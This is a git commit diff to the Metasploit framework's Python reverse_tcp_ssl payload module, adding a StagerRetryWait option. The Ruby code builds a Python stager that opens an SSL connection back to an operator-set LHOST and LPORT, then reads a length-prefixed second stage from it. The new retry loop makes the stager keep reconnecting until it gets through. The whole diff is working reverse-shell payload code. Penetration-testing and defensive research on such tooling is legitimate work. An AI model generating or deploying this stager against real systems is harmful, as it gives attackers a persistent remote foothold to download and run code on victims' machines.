73be4f1c2e8bc265c6db9594010e1d786fda2e31
itsmeroy2012 <royindraroy12@gmail.com>
2017-05-04 14:51:40 +0530

    Adding StagerRetryWait option in reverse_tcp_ssl

--- lib/msf/core/payload/python/reverse_tcp_ssl.rb
+++ lib/msf/core/payload/python/reverse_tcp_ssl.rb
@@ -22,7 +22,8 @@ module Payload::Python::ReverseTcpSsl
   def generate
     conf = {
       port:        datastore['LPORT'],
-      host:        datastore['LHOST']
+      host:        datastore['LHOST'],
+      retry_wait:  datastore['StagerRetryWait']
     }
 
     generate_reverse_tcp_ssl(conf)
@@ -42,10 +43,25 @@ module Payload::Python::ReverseTcpSsl
 
   def generate_reverse_tcp_ssl(opts={})
     # Set up the socket
-    cmd  = "import ssl,socket,struct\n"
-    cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
-    cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
-    cmd << "s=ssl.wrap_socket(so)\n"
+    cmd  = "import ssl,socket,struct#{datastore['StagerRetryWait'].to_i > 0 ? ',time' : ''}\n"
+    if datastore['StagerRetryWait'].blank? # do not retry at all (old style)
+      cmd << "so=socket.socket(2,1)\n" # socket.AF_INET = 2
+      cmd << "so.connect(('#{opts[:host]}',#{opts[:port]}))\n"
+      cmd << "s=ssl.wrap_socket(so)\n"
+    else
+      cmd << "while 1:\n"
+      cmd << "\ttry:\n"
+      cmd << "\t\tso=socket.socket(2,1)\n" # socket.AF_INET = 2
+      cmd << "\t\tso.connect(('#{opts[:host]}',#{opts[:port]}))\n"
+      cmd << "\t\ts=ssl.wrap_socket(so)\n"
+      cmd << "\t\tbreak\n"
+      cmd << "\texcept:\n"
+      if datastore['StagerRetryWait'].to_i <= 0
+        cmd << "\t\tpass\n" # retry immediately
+      else
+        cmd << "\t\ttime.sleep(#{datastore['StagerRetryWait'].to_i})\n" # retry after waiting
+      end
+    end
     cmd << py_send_uuid if include_send_uuid
     cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
     cmd << "d=s.recv(l)\n"
